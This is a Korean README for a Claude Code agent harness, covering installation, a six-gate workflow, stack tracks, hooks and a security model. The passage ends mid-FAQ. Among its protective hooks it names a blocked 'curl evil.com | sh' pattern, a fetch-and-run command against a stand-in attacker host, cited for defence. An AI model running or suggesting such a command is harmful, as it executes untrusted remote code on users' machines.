# uzys-claude-harness

> Claude Code 에이전트 하네스 — 6-gate 워크플로우 + Ralph 루프 + 11 스택 트랙. Lean by design.

[![License](https://img.shields.io/badge/license-MIT-blue.svg)](LICENSE)
[![Version](https://img.shields.io/github/v/tag/uzysjung/uzys-claude-harness?label=version)](https://github.com/uzysjung/uzys-claude-harness/releases)
[![CI](https://github.com/uzysjung/uzys-claude-harness/actions/workflows/test.yml/badge.svg)](https://github.com/uzysjung/uzys-claude-harness/actions)

🇬🇧 **English README**: [README.md](./README.md)

## 30초 시작

```bash
# 프로젝트 디렉토리에서:
npx -y github:uzysjung/uzys-claude-harness
# → 인터랙티브로 Track, 옵션 (v26.45.0 부터 카테고리별 그룹화 + 출처 라벨), CLI 타깃.
#   /uzys:* 6-gate 슬래시 커맨드를 쓰려면 옵션에서 'uzys-harness 6-Gate workflow' 체크
#   (v26.44.0+ BREAKING — 이전엔 dev 트랙 자동 설치).

# Claude Code 시작:
claude
> /uzys:spec    # 만들 것 정의
> /uzys:auto    # 전체 파이프라인 (Plan → Build → Test → Review → Ship) 실행
```

프롬프트에서 선택 가능한 Track: `csr-supabase`, `csr-fastify`, `csr-fastapi`, `ssr-nextjs`, `ssr-htmx`, `data`, `executive`, `tooling`, `full`, `project-management`, `growth-marketing` — [Tracks](#tracks-) 참조.

> 대안: `bash <(curl -fsSL https://raw.githubusercontent.com/uzysjung/uzys-claude-harness/main/install.sh)` — 기존 docs 호환용 wrapper. 내부에서 동일 `npx` 호출. `npx`가 PATH에 없는데 Node 20+는 있는 환경에 사용. CI/비대화형 스크립트는 [플래그 모드](#플래그-모드-ci--자동화) 참조.

## 왜 써야 하나요?

| 이때 사용 | 이때 패스 |
|----------|-----------|
| **결정론적 6-gate 워크플로우** (Spec → Ship)를 free-form chat 대신 원할 때 | 한 줄 fix만 필요 → 그냥 Claude Code |
| **여러 스택** (Python REST + React, Next.js, data/PySide6, executive docs) 가로질러 같은 하네스 원함 | 한 스택 + 한 도구 세트만 사용 |
| **ECC, agent-skills, Anthropic skills, Railway, Supabase**를 트랙별로 자동 wired up 원함 | 각 plugin/MCP 직접 설치하며 통제 원함 |
| LLM을 **hook으로 제약** (파일 보호, 보안 스캔, gate 순서)하길 원함 — 단순 prompt 아님 | 모델과 파일시스템 사이 최소 개입 원함 |
| **Lean** 가치 — 모든 Rule/Hook이 제 역할 함; 명백한 linter 영역은 제거 | 포괄적 style guide + "best practices" 강제 좋아함 |

## 이게 뭔가요?

[Claude Code](https://claude.com/claude-code) 위에서 동작하는 **결정론적 하네스**:

- **6-gate 워크플로우** (`Spec → Plan → Build → Test → Review → Ship`) hook으로 강제
- **11 스택 트랙** 지원 (csr-supabase / csr-fastify / csr-fastapi / ssr-htmx / ssr-nextjs / data / executive / tooling / full / project-management / growth-marketing)
- 트랙별로 **검증된 plugins / skills / MCP servers / agents** 번들 ([docs/REFERENCE.md](./docs/REFERENCE.md))
- **Lean** 유지 — Rule 17 / Hook 자동등록 6. 자명하거나 중복인 것은 제거
- **continuous-learning + Ralph 루프**로 자기 개선 (SPEC 기반 자율 사이클)
- 프로젝트 스코프 전용. **글로벌 `~/.claude/`는 절대 건드리지 않음**

### 자체 skill (custom)

cherry-pick한 외부 skill 외에, 본 하네스가 직접 제공하는 3개 스킬:

| Skill | 목적 | 사용 시점 |
|-------|------|---------|
| **`north-star`** | 4-gate decision heuristic(Trend/Persona/Capability/Lean) + NORTH_STAR.md 템플릿. Plan 전 scope creep 차단 | `/uzys:spec` 시작 시 6개월+ 프로젝트 권장, `/uzys:plan`의 Complex task |
| **`ui-visual-review`** | Playwright/chrome-devtools 스크린샷 캡처 → baseline diff → 에이전트 REGRESSION 분류 → 사용자 승인. Review Gate 차단 연결 | `/uzys:test` PASS (csr-*/ssr-*/full 트랙) |
| **`spec-scaling`** | SPEC/PRD 300줄 초과 시 기능별(docs/specs/) 또는 영역별(docs/PRD/) 분리 제안 | `/uzys:spec`에서 문서가 커질 때 자동 |

추가로 알아둘 템플릿: **`docs/PLAN.template.md`** (Phase × Milestone 의존성 그래프 + Critical Path), **`docs/NORTH_STAR.template.md`**, **ADR Status 흐름** (`Proposed → Accepted → Superseded/Deprecated`) — `.claude/rules/change-management.md`.

CTO/COO 출신 눈높이의 시니어 엔지니어 / 멀티 역할 사용자(CEO/CTO/CISO/데이터 사이언티스트)가 매우 다른 스택에서 같은 하네스를 쓰고 싶을 때 사용.

## 설치

### Step 1 — Track 선택

| 만들고 있는 스택 | 설치할 Track |
|----------------|------------|
| Python REST API + React/shadcn/ui | `csr-fastapi` |
| TypeScript REST API + React/shadcn/ui | `csr-fastify` |
| 실시간/Auth/PostgreSQL (Supabase) + React/shadcn/ui | `csr-supabase` |
| SEO 필요 + React/shadcn/ui (SSR) | `ssr-nextjs` |
| 최소 JS (서버 렌더 + HTMX + daisyUI) | `ssr-htmx` |
| 데이터 분석/ML/DL/PySide6 desktop | `data` |
| 제안서/PPT/재무모델 (코드 없음) | `executive` |
| Bash/CLI/Markdown 메타 프로젝트 | `tooling` |
| 둘 이상 동시 (예: tooling + Python) | `--track tooling --track csr-fastapi` (다중) 또는 `full` |

### Step 2 — 설치 (인터랙티브 권장)

```bash
# 프로젝트 디렉토리에서:
npx -y github:uzysjung/uzys-claude-harness
```

인스톨러가 현재 상태를 자동 감지:

- **처음 설치** → 단계별 안내: Track 선택 → Tauri / GSD / ECC / Trail of Bits 옵션 → CLI 타깃 (Claude / Codex / OpenCode / All) → 요약 → 확인
- **기존 설치 감지** → 5-메뉴 표시:
  1. 새 Track 추가
  2. 정책 파일 업데이트 (백업 자동)
  3. Track 제거 *(v27 미지원 — `.claude/` 수동 편집)*
  4. 재설치 (현재 `.claude/` 백업 후 처음부터)
  5. 종료

#### 플래그 모드 (CI / 자동화)

CI/CD나 스크립트 환경에서는 `install` 서브커맨드 + 플래그 사용:

```bash
npx -y github:uzysjung/uzys-claude-harness install --track <TRACK>
```

`install`은 `--track` 최소 1개 필수. 비-TTY 환경 + `--track` 누락 시 에러로 종료.

설치 동작:
1. npx가 GitHub ref에서 최신 CLI를 임시 fetch
2. Track별 자산을 `.claude/`, `.mcp.json`, 프로젝트 root에 복사
3. (옵션) `--cli`에 codex/opencode 포함 시 `.codex/` / `.opencode/` 자산 추가 생성
4. 설치된 Track을 `.claude/.installed-tracks`에 기록 (다음 설치 상태 감지용)

### Step 3 — Claude Code 시작

```bash
claude
# Claude Code 안에서:
/uzys:spec    # 만들 것을 정의
/uzys:auto    # 그 후 전체 파이프라인 (Plan → Build → Test → Review → Ship) 실행
```

---

## 자주 쓰는 시나리오

### 기존 설치에 Track 추가

이미 `csr-fastapi` 설치했고, `tooling` (하네스의 bash/markdown 작업용)도 추가하고 싶다면:

```bash
npx -y github:uzysjung/uzys-claude-harness
# → 기존 설치 감지 → 5-메뉴 → "1) 새 Track 추가" 선택 → Track 선택 → 확인
```

Add Track 액션은 기존 `.claude/*`를 보존하고 새 MCP를 `.mcp.json`에 idempotent merge.

### 기존 설치를 최신 하네스 버전으로 업데이트

새 release가 나오면 ([CHANGELOG.md](./CHANGELOG.md) 확인):

```bash
npx -y github:uzysjung/uzys-claude-harness
# → 5-메뉴 → "2) 정책 파일 업데이트 (백업 자동)" 선택
```

Update 액션 동작:
1. **백업** — 현재 `.claude/`를 `.claude.backup-<timestamp>/`로 스냅샷
2. **덮어쓰기** — `rules/*.md`, `agents/*.md`, `commands/uzys/*.md`, `hooks/*.sh`, `.claude/CLAUDE.md` 중 **이미 존재하는 파일만** 최신 templates로 덮어쓰기 (Track 혼입 방지)
3. **Orphan prune** — `.claude/`에 있지만 templates에는 없는 파일 제거 (예: 폐기된 `ecc-security-common.md`)
4. **Stale hook ref 정리** — 존재하지 않는 hook 파일을 가리키는 `settings.json` PreToolUse/PostToolUse 항목 제거

**보존**: `gate-status.json`, `.mcp.json` (사용자 추가 MCP 유지), `docs/SPEC.md`/`PRD.md`, `.claude/settings.local.json`.

문제 시 rollback:
```bash
rm -rf .claude && mv .claude.backup-<timestamp> .claude
```

### 이 리포 자체에 dogfood 설치

```bash
git clone https://github.com/uzysjung/uzys-claude-harness.git
cd uzys-claude-harness
npx -y github:uzysjung/uzys-claude-harness
# → Track 프롬프트에서 `tooling` 선택
```

### 다중 Track 동시 설치 (union)

```bash
npx -y github:uzysjung/uzys-claude-harness
# → Track 프롬프트에서 <space>로 여러 개 선택 (예: tooling + csr-fastapi)
```

처음부터 여러 Track 필요한 걸 알면 이게 가장 빠름 (2회 setup보다 빠름).

### Optional — ECC plugin 프로젝트 스코프 설치

**대화형 터미널** (또는 `curl | bash` — `/dev/tty`로 동작) 환경에서 인터랙티브 인스톨러가 묻는다:

```
[ECC] Plugin 프로젝트 스코프 설치 (선택사항)
[ECC] 설치(copy) 진행? [y/N]
[ECC] 불필요 항목 제거(prune)? [y/N]
```

둘 다 `y`면 [Everything-Claude-Code](https://github.com/affaan-m/everything-claude-code)를 `.claude/local-plugins/ecc/`로 복사하고 ~228 항목 prune. 사용:

```bash
claude --plugin-dir .claude/local-plugins/ecc
# 또는 ~/.zshrc:
# alias claude-ecc='claude --plugin-dir .claude/local-plugins/ecc'
```

글로벌 `~/.claude/`는 절대 무영향.

### 인터랙티브 프롬프트 — 무엇을 묻고, 언제 뜨고, 어떻게 skip 하나

`claude-harness install`은 4개의 선택 프롬프트가 있다. 각각 비대화형 자동 진행 플래그가 있음.

| 프롬프트 | 언제 표시? | 자동-y 플래그 |
|---------|----------|--------------|
| **Track 선택** (1-9) | `--track` 미명시 AND TTY 가용 | `--track <이름>` |
| **GSD 오케스트레이터** | dev track AND fresh install (`--add-track` 아님) AND TTY 가용 | `--gsd` |
| **Trail of Bits 보안** | dev track AND fresh install AND TTY 가용 | `--with-tob` |
| **ECC 프로젝트 스코프 설치** | fresh install AND TTY 가용 | `--with-ecc` |
| **ECC prune (89 KEEP)** | ECC 설치 확정 후 | `--with-prune` (`--with-ecc` 자동 포함) |

#### 환경 ↔ 프롬프트 동작

| 환경 | TTY 가용? | 프롬프트 표시? |
|------|:-:|:-:|
| 로컬 터미널 `claude-harness install ...` | ✅ | ✅ |
| **`curl … \| bash …` (터미널에서 실행)** | ✅ (`/dev/tty`로) | ✅ |
| CI runner / SSH `-T` no-tty | ❌ | ❌ (자동 skip; 플래그 사용) |

#### Add Track / Update는 인터랙티브 메뉴로

기존 설치를 augment하는 Add Track / Update는 v0.2.0에서 인터랙티브 5-메뉴로 통합. 플래그 없이 인스톨러를 실행하면 5-메뉴가 자동 라우팅:

```bash
npx -y github:uzysjung/uzys-claude-harness
# → 기존 설치 감지 → 5-메뉴 진입
```

#### 완전 비대화형 설치 (CI / 스크립트)

TTY 환경에서는 인터랙티브가 각 opt-in을 묻는다. **CI / 비-TTY**에서는 프롬프트 불가 — 명시 플래그 없으면 기본 skip. 최소:

```bash
npx -y github:uzysjung/uzys-claude-harness install --track csr-fastapi
```

CI에서 opt-in 기능 켜고 싶으면 플래그 추가:

| 플래그 | 활성 (TTY 모드라면 프롬프트로 묻는 항목) |
|------|------------------------------------------------|
| `--with-ecc` | ECC plugin 프로젝트 스코프 설치 |
| `--with-prune` | ECC 89 큐레이트 외 항목 prune (`--with-ecc` 자동 포함) |
| `--with-tob` | Trail of Bits 보안 플러그인 |
| `--with-gsd` | GSD 오케스트레이터 |
| `--with-tauri` | Tauri 데스크톱 rule 추가 |

### 기타 옵션

```bash
npx -y github:uzysjung/uzys-claude-harness install --help         # 전체 옵션 표시
```

### 사전 요구사항

- Node.js 22+
- Git
- Claude Code CLI (`claude`)
- jq (권장; bash fallback 있음)

## CLAUDE.md 위치 (canonical 명시)

이 리포지토리에는 4종류 CLAUDE.md가 있음 — 역할 분리:

| 위치 | 역할 | 누가 사용? |
|------|------|----------|
| `/CLAUDE.md` (root) | **이 메타 리포 자체용** (tooling Track) | uzys-claude-harness 개발 시 |
| `/.claude/CLAUDE.md` | **이 메타 리포 적용 글로벌 원칙** (11 Principles + Decision Meta-Rule) | 이 리포에서 작업 시 Claude가 읽음 |
| `/templates/CLAUDE.md` | **신규 프로젝트로 복사되는 원본 템플릿** | `claude-harness install`이 신규 프로젝트의 `.claude/CLAUDE.md`로 복사 |
| `/templates/project-claude/_base.md` + `fragments/<track>/<section>.md` | **신규 프로젝트의 root `/CLAUDE.md`로 머지되는 Track별 fragment** | `claude-harness install`이 single/multi/full 트랙 모두 자동 머지 |

**Canonical 원본**: `/templates/CLAUDE.md` 와 `/templates/project-claude/_base.md` + fragment.

## Tracks

| Track | 스택 | 역할 |
|-------|-----|-----|
| `csr-supabase` | Supabase + React/shadcn/ui (Vercel/Netlify 배포) | 개발자 |
| `csr-fastify` | TypeScript REST API + React/shadcn/ui | 개발자 |
| `csr-fastapi` | Python REST API + React/shadcn/ui | 개발자 |
| `ssr-htmx` | FastAPI + Jinja2 + HTMX + daisyUI | 개발자 |
| `ssr-nextjs` | Next.js + shadcn/ui | 개발자 |
| `data` | Python + DuckDB + Trino + ML/DL + PySide6 | 데이터 사이언티스트 |
| `executive` | PPT/Excel/Word/PDF + 제안서/DD | CPO/CSO/CTO |
| `tooling` | Bash + Markdown + CLI 도구 (메타 프로젝트) | 도구/하네스 개발자 |
| `full` | 모든 트랙 union | 전체 |
| `project-management` (v0.5.0) | Jira/Confluence/Atlassian + PRD/RICE | PM / Scrum Master |
| `growth-marketing` (v0.5.0) | SEO/CRO/콘텐츠/demand-gen | Growth / Marketing Lead |

### Track 결정 가이드

| 상황 | 권장 Track |
|------|----------|
| Python REST API + React 프론트 | `csr-fastapi` |
| TypeScript REST API + React 프론트 | `csr-fastify` |
| 실시간/Auth/PostgreSQL 우선 (Supabase) | `csr-supabase` |
| SEO 필요 + React (SSR) | `ssr-nextjs` |
| 최소 JS (서버 렌더 + HTMX) | `ssr-htmx` |
| 데이터 분석/ML/DL/PySide6 desktop | `data` |
| 제안서/PPT/재무모델 (코드 없음) | `executive` |
| Bash/CLI/Markdown 메타 프로젝트 | `tooling` |
| 둘 이상 동시 (예: tooling + Python) | `--track tooling --track csr-fastapi` 또는 `full` |

### 공통 도구 (모든 dev Track 기본 설치)

executive는 `market-research` 중심 서브셋.

| 분류 | 항목 | 용도 |
|------|------|------|
| Plugin | `addy-agent-skills`, `Impeccable` | 6-gate 워크플로우 + 디자인 품질 |
| Plugin (v0.5.0) | `karpathy-coder` | 4 Python 도구 + reviewer 에이전트 + `/karpathy-check` + pre-commit hook — CLAUDE.md P1-P4 enforcement. v0.6.0+ `--with-karpathy-hook` opt-in 시 PreToolUse 자동 와이어링 (USAGE 4 level 가이드) |
| Skill (cherry-pick) | `deep-research` | firecrawl + exa 멀티 소스 조사 — 전체 dev |
| Skill (cherry-pick) | `market-research` | 경쟁/TAM 조사 — `executive` 한정 |
| Skill (npx) | `find-skills` (vercel-labs) | 필요 시점 skill 검색/설치 |
| CLI (global) | `agent-browser` (vercel-labs) | 브라우저 자동화 CLI |
| CLI (global) | `playwright` | E2E + UI visual review |
| MCP (project) | `context7`, `github`, `chrome-devtools` | 문서 조회 / GitHub / DevTools. `.mcp.json`으로 프로젝트 스코프 |
| statusLine | `claude-powerline` | `.claude/settings.json`이 자동 구동 |

전체 자산 목록 + 신뢰 등급: [docs/REFERENCE.md](./docs/REFERENCE.md).

## Codex CLI 지원

Claude Code 외에 **OpenAI Codex CLI** (0.124.0+) 설치도 지원한다. Claude Code가 SSOT이며 Codex 자산은 변환 스크립트로 파생된다.

### Codex 설치

인터랙티브 (권장):
```bash
npx -y github:uzysjung/uzys-claude-harness
# 선택: ① tooling   |   2c) CLI: ② Codex
```

플래그 모드 (CI / 자동화):
```bash
npx -y github:uzysjung/uzys-claude-harness --track tooling --cli codex --project-dir .
```

`--cli`는 **repeatable** (v0.7.0+). `claude` / `codex` / `opencode` 중 부분집합 (3 base × 7 combination).

```bash
--cli codex                            # 단일
--cli claude --cli codex               # multi (= legacy --cli both)
--cli claude --cli codex --cli opencode  # 3개 (= legacy --cli all)
--cli claude --cli opencode            # Codex 제외 (신규)
--cli codex --cli opencode             # Claude 제외 (신규)
```

**Legacy alias deprecated (v0.8+ 제거)**: `--cli both`/`--cli all` 사용 시 warning + 자동 변환.

**Codex slash 통일**: `--with-codex-prompts` 추가 → `~/.codex/prompts/uzys-*.md` 6 file 글로벌 복사 (D16 opt-in) → Codex에서 `/uzys-spec` slash 작동. 자세한 내용 [USAGE.md](./docs/USAGE.md#multi-cli-설치-v070-breaking).

### 생성되는 자산

`--cli=codex`, `--cli=both`, 또는 `--cli=all`이면, 표준 설치 완료 후 `src/codex/transform.ts`가 다음을 생성:

```
<project>/
├── AGENTS.md                          # .claude/CLAUDE.md에서 변환 생성
└── .codex/
    ├── config.toml                    # sandbox + approval + [[hooks.*]] + [mcp_servers.*]
    └── hooks/
        ├── session-start.sh           # session_start
        ├── hito-counter.sh            # user_prompt_submit
        └── gate-check.sh              # pre_tool_use matcher="Skill"

~/.codex/skills/uzys-{spec,plan,build,test,review,ship}/SKILL.md   # opt-in (확인 받음)
```

Slash 이름: Codex는 `:`를 슬래시에서 미지원하여 `/uzys:spec` → `/uzys-spec` 형태로 rename됨.

### 두 가지 opt-in 프롬프트 (`~/.codex/` 수정)

변환 후 설치 스크립트가 묻는 두 가지:

```
~/.codex/skills/ 에 uzys-* 6종 설치? [y/N]
~/.codex/config.toml 에 프로젝트 trust entry 추가? [y/N]
```

기본값 모두 **No**. 거절 시 글로벌 변경 0. 두 번째 질문 승인은 프로젝트 스코프 `.codex/config.toml` 훅 로드를 위해 필요.

### 알려진 제약 (Codex 0.124.0 upstream)

- **`pre_tool_use` / `post_tool_use`는 Bash 툴에만 발화** — ApplyPatch(파일 쓰기)는 가로채지 않음 ([openai/codex#16732](https://github.com/openai/codex/issues/16732)). 하네스는 `sandbox_mode = "workspace-write"` + `approval_policy = "on-request"` 조합으로 보완 (파일 쓰기 경로에선 hook보다 강력).
- **인터랙티브 세션에서 프로젝트 스코프 hook 미로드 가능** ([openai/codex#17532](https://github.com/openai/codex/issues/17532)). `codex exec` 비대화형은 영향 없음.

### 참고

- 풀 SPEC: [`docs/specs/codex-compat.md`](./docs/specs/codex-compat.md)
- Hook 전략 ADR: [`docs/decisions/ADR-002-codex-hook-gap.md`](./docs/decisions/ADR-002-codex-hook-gap.md) (Accepted)
- 호환 매트릭스: [`docs/research/codex-compat-matrix-2026-04-24.md`](./docs/research/codex-compat-matrix-2026-04-24.md)
- Dogfood 검증: [`docs/evals/codex-install-2026-04-25.md`](./docs/evals/codex-install-2026-04-25.md)

## OpenCode CLI 지원

Claude Code/Codex 외에 **[OpenCode](https://opencode.ai)** (anomalyco/opencode 0.x) 설치도 지원. Claude Code가 SSOT — OpenCode 자산은 TS transform + JS/TS plugin (hook lifecycle)로 파생.

### OpenCode 설치

인터랙티브 (권장):
```bash
npx -y github:uzysjung/uzys-claude-harness
# 선택: ① tooling   |   2c) CLI: ③ OpenCode (또는 ⑤ All)
```

플래그 모드 (CI / 자동화):
```bash
npx -y github:uzysjung/uzys-claude-harness install --track tooling --cli opencode
```

`--cli=all`은 Claude + Codex + OpenCode를 한 번에 설치.

### 생성 자산

`--cli=opencode` 또는 `--cli=all`이면, 표준 설치 완료 후 `src/opencode/transform.ts`가 다음을 생성:

```
<project>/
├── AGENTS.md                                      # .claude/CLAUDE.md에서 생성 (slash rename)
├── opencode.json                                  # $schema + mcp + command + agent + plugin + permission
└── .opencode/
    ├── commands/
    │   ├── uzys-spec.md                          # frontmatter: description + agent
    │   ├── uzys-plan.md
    │   ├── uzys-build.md
    │   ├── uzys-test.md
    │   ├── uzys-review.md
    │   └── uzys-ship.md
    └── plugins/
        └── uzys-harness.ts                       # 3 hook plugin (TS, self-contained)
```

글로벌 미터치 — `~/.opencode/`는 절대 안 건드림 (D16).

### Hook lifecycle (3 hook 매핑)

OpenCode plugin API는 풍부한 lifecycle hook을 지원. 번들된 `uzys-harness.ts` plugin이 Claude Code hook 3종을 1:1 매핑:

| Claude hook | OpenCode plugin hook | 동작 |
|-------------|----------------------|------|
| `PreToolUse` (gate-check) | `tool.execute.before` | `/uzys-<phase>`가 이전 게이트 미완료 시 throw로 차단 |
| `PostToolUse` (spec-drift) | `tool.execute.after` | `docs/SPEC.md` 또는 `docs/specs/*.md` 편집 시 `.claude/evals/spec-drift-YYYY-MM-DD.log`에 기록 |
| `UserPromptSubmit` (HITO) | `messageCreated` (`role==="user"` 필터) | `.claude/evals/hito-YYYY-MM-DD.log`에 타임스탬프 추가 (privacy: prompt 본문 미기록) |

Slash 커맨드: 파일명 = 커맨드명 (`uzys-spec.md` → `/uzys-spec`). filesystem 호환을 위해 hyphen 채택 (Phase B2 결정).

### Slash 커맨드

```
/uzys-spec     Define
/uzys-plan     Plan
/uzys-build    Build
/uzys-test     Verify
/uzys-review   Review
/uzys-ship     Ship
```

### 알려진 제약 (Phase F dogfood — 라이브 검증 사후)

- Plugin runtime (Bun vs Node) — `node:fs` + `@opencode-ai/plugin` 1.14.24 사용; 양쪽 런타임 호환.
- 라이브 `tool.execute.before` 인자 시그니처 — plugin에 3 폴백 경로 (`input.command` / `input.tool` / `input.args.command`); 정적 테스트로 검증 완료, 라이브 시그니처 검증은 사후.

### 참고

- 풀 SPEC: [`docs/specs/opencode-compat.md`](./docs/specs/opencode-compat.md)
- Plugin 매핑 ADR: [`docs/decisions/ADR-004-opencode-plugin-mapping.md`](./docs/decisions/ADR-004-opencode-plugin-mapping.md) (Accepted)
- 호환 매트릭스: [`docs/research/opencode-compat-matrix-2026-04-25.md`](./docs/research/opencode-compat-matrix-2026-04-25.md)
- Dogfood 검증: [`docs/evals/opencode-install-2026-04-25.md`](./docs/evals/opencode-install-2026-04-25.md)

## 11개 행동 원칙

Karpathy LLM 관찰 + Anthropic Harness Design + 실전 운영 경험에서 추출:

1. **Think Before Acting** — 가정 금지, 모호하면 확인
2. **Simplicity First** — 명시되지 않은 것은 범위 밖
3. **Surgical Changes** — 건드려야 할 것만, DO NOT CHANGE 보호
4. **Goal-Driven Execution** — 검증 가능한 성공 기준
5. **Separate Eval from Gen** — reviewer subagent context fork로 SOD 강제
6. **Long-Running Management** — Phase + 인간 게이트
7. **Fact vs Opinion** — 출처 필수
8. **Sprint Contract** — 작업 전 "완료" 정의
9. **Circuit Breakers** — 3회 실패 → 멈추고 보고
10. **Harness Maintenance** — 단순 시작, 필요 시만 추가, 분기 1회 prune
11. **Perimeter Not Blueprint** — what + why + 경계만 주고 how는 에이전트 결정

추가 **Decision Making 메타 원칙**: 모든 가치 판단은 명시된 검증 가능한 기준에 근거. 추정/감각 금지.

### Design Philosophy

- **HyperAgents**: 메타 개선 가능 (인간 게이트 필수). auto memory + CL-v2 instinct로 경험 축적
- **gitagent SOD**: agent 정의는 git 버전 관리. reviewer ≠ implementor. 메모리는 Git에
- **agent-skills**: 6-gate 워크플로우(Define→Plan→Build→Verify→Review→Ship)가 뼈대

## 동작 구조

```
┌────────────────────────────────────────────────────────────────┐
│  Project (.claude/)                                             │
│  CLAUDE.md  →  11 원칙 + Decision Meta-Rule + Gates             │
│                                                                  │
│  ┌─────────────┐  ┌─────────────┐  ┌─────────────┐             │
│  │ commands/   │  │ rules/ (17) │  │ skills/     │             │
│  │ uzys:* (7)  │  │ git-policy  │  │ CL-v2       │             │
│  │ ecc:*  (8)  │  │ test-policy │  │ spec-scaling│             │
│  │             │  │ ship-       │  │ deep-       │             │
│  │             │  │ checklist   │  │ research    │             │
│  └─────────────┘  └─────────────┘  └─────────────┘             │
│  ┌─────────────┐  ┌─────────────┐  ┌─────────────┐             │
│  │ agents/ (8) │  │ hooks/ (6)  │  │ .mcp.json   │             │
│  │ reviewer    │  │ session     │  │ context7    │             │
│  │ data-       │  │ protect     │  │ github      │             │
│  │ analyst     │  │ gate-check  │  │ chrome-     │             │
│  │ strategist  │  │ agentshield │  │ devtools    │             │
│  │ + 5 ECC     │  │ + 1 utility │  │ + 트랙별    │             │
│  └─────────────┘  └─────────────┘  └─────────────┘             │
└────────────────────────────────────────────────────────────────┘
```

6-gate는 `gate-check.sh` PreToolUse hook으로 강제. 게이트 건너뛰기 시 exit 2 + blocker 메시지. `/uzys:auto`가 SPEC 만족까지 Ralph 루프로 자율 실행 (최대 5 iter).

## 예시 워크플로우

`csr-fastapi`로 "Postgres + Auth 사용하는 사내 노트 앱" 만들기:

```bash
# 1. Fresh 프로젝트에 하네스 설치
mkdir notes && cd notes && git init
npx -y github:uzysjung/uzys-claude-harness
# → Track 프롬프트에서 `csr-fastapi` 선택

# 2. Claude Code 시작
claude

# Claude Code 안에서:
> /uzys:spec
# → Pre-SPEC 질의 시작:
#   - Prod DB 엔진?              "Postgres 16 (Railway)"
#   - 테스트 DB 전략?            "testcontainer (Postgres 16)"
#   - 외부 의존성?               "GitHub OAuth (Live staging E2E 필수)"
#   - 핵심 E2E 플로우?           "login → callback → /me, 노트 생성"
#   - DESIGN.md/.impeccable.md?  "없음 — /teach 먼저 호출해 디자인 톤 잡기"
# → docs/SPEC.md 생성 (Objective, AC, Non-Goals, DO NOT CHANGE 포함)

> /uzys:auto
# → Plan: trivial=skip, standard=milestone(3-5), complex=full task list
#   (모델 인식 — Opus는 micro-decomposition skip, Haiku는 detailed)
# → Build: task별 RED → GREEN → REFACTOR
# → Test: testcontainer Postgres + Live OAuth E2E (Mock 금지)
# → Review: 5축 (correctness/readability/architecture/security/perf)
#   reviewer subagent (context: fork) — 구현자와 분리
# → Ship: agentshield scan + SPEC drift check + Railway 배포
# → Ralph 루프 최대 5회 반복, SPEC AC 미충족 시 사용자 escalation
```

배경 동작:
- `protect-files.sh`가 `.env`, lock 파일, credentials Edit 차단
- `gate-check.sh`가 `define.completed=false`면 `/uzys:plan` 차단
- `mcp-pre-exec.sh`가 MCP allowlist + `curl evil.com | sh` 패턴 차단
- `agentshield-gate.sh`가 CRITICAL finding 시 `/uzys:ship` 차단

## ECC plugin 통합 (선택)

[Everything-Claude-Code (ECC)](https://github.com/affaan-m/everything-claude-code)는 300+ skills/agents/commands 번들. `claude-harness install` 마지막에 2단계 프롬프트:

```
[ECC] Plugin 프로젝트 스코프 설치 (선택사항)
  1. ECC plugin을 프로젝트 스코프로 설치(copy)? [y/N]
  2. ECC에서 불필요 항목을 제거(prune)? [y/N]
  → DELETED/KEPT 파일 목록 화면 표시
```

이후 `claude --plugin-dir .claude/local-plugins/ecc`로 사용. 글로벌 `~/.claude/` 무영향.

## Cherry-pick 업데이트

Cherry-pick(ECC skill, claude-powerline 래퍼 등)은 `.dev-references/cherrypicks.lock`에서 source repo + 커밋 SHA + 파일별 해시로 추적:

```bash
# drift만 확인 (수정 안 함)
bash scripts/sync-cherrypicks.sh

# 수정되지 않은 파일의 상류 변경을 자동 반영
bash scripts/sync-cherrypicks.sh --apply

# CI 게이트 — drift 있으면 exit 1
bash scripts/sync-cherrypicks.sh --check
```

로컬 수정된 cherry-pick은 `modified: true`로 표시되어 **절대 자동 덮어쓰지 않음** — drift만 보고.

## 보안 모델

- **MCP allowlist**: `.mcp-allowlist` 파일이 모든 MCP 호출을 `mcp-pre-exec.sh` hook으로 게이팅
- **D16 보호**: `claude-harness install --project-dir`이 `~/.claude/*`, `/etc/*`, 시스템 bins 차단
- **`.env` / credentials 보호**: `protect-files.sh` hook이 보호 경로 Write/Edit 차단
- **Pre-ship 보안 게이트**: `agentshield-gate.sh`가 `/uzys:ship` 전 `npx ecc-agentshield scan` 실행
- 전체 보안 정책: [docs/REFERENCE.md §8](./docs/REFERENCE.md#8-보안--신뢰-정책)

## 프로젝트 발전 방향

3가지 commitment (`templates/CLAUDE.md` 참조):

1. **ECC.tools 의존** — 자체 구현 최소화, ECC 스킬/에이전트를 `/uzys:*`로 orchestrate
2. **Ralph 루프 자율성** — continuous-learning-v2 + `/uzys:auto` SPEC 기반 자율 사이클
3. **Lean by design** — 기능 추가 전 "ECC에 있는가?" 확인 → 분기 1회 P10 재평가

## 문서

| 파일 | 용도 |
|------|------|
| [README.md](./README.md) | 영어 README |
| [docs/USAGE.md](./docs/USAGE.md) | 일상 워크플로우 가이드 (`/uzys:*` 명령, 게이트 흐름) |
| [**docs/REFERENCE.md**](./docs/REFERENCE.md) | **설치되는 모든 자산 카탈로그** (Plugins / Skills / MCP / Agents / Cherry-pick) — 출처 / 신뢰 등급 / 정확한 설치 명령 |
| [CONTRIBUTING.md](./CONTRIBUTING.md) | 트랙 / Rule / Hook / 명령 추가 방법 |
| [CHANGELOG.md](./CHANGELOG.md) | 릴리즈 히스토리 |

## FAQ

**Q. Linux / WSL / Windows에서 동작하나?**
A. macOS + Linux (WSL 포함)는 CI에서 검증. Native Windows shell은 미지원 — WSL 사용 권장.

**Q. 글로벌 `~/.claude/`를 건드리나?**
A. 안 건드림. `claude-harness install --project-dir`이 `~/.claude/*`, `/etc/*`, `/usr/bin/*` 등 차단 (D16 보호). 모든 설치는 프로젝트 스코프.

**Q. 이전 버전 설치돼 있는데?**
A. `npx -y github:uzysjung/uzys-claude-harness --update --project-dir .` — `.claude/`를 `.claude.backup-<ts>/`로 백업 + 기존 파일만 latest templates로 덮어쓰기 + orphan 자동 제거 (예: 폐기된 rule) + `settings.json` stale hook 참조 정리.

**Q. 11 Track은 너무 많은 거 아닌가?**
A. Track은 조건부 install list일 뿐 abstraction 아님. Track 추가 = TSV 한 줄 + rule 매핑 한 줄. 런타임 비용 0. 필요한 Track만 사용; `--track` 명시 선택.

**Q. ECC plugin 없이도 쓸 수 있나?**
A. 가능. ECC는 opt-in (인터랙티브 프롬프트 또는 `--with-ecc` 플래그). 6-gate workflow + agent-skills + 트랙별 plugin은 standalone 동작.

**Q. 새 Track / Rule / Hook 추가하려면?**
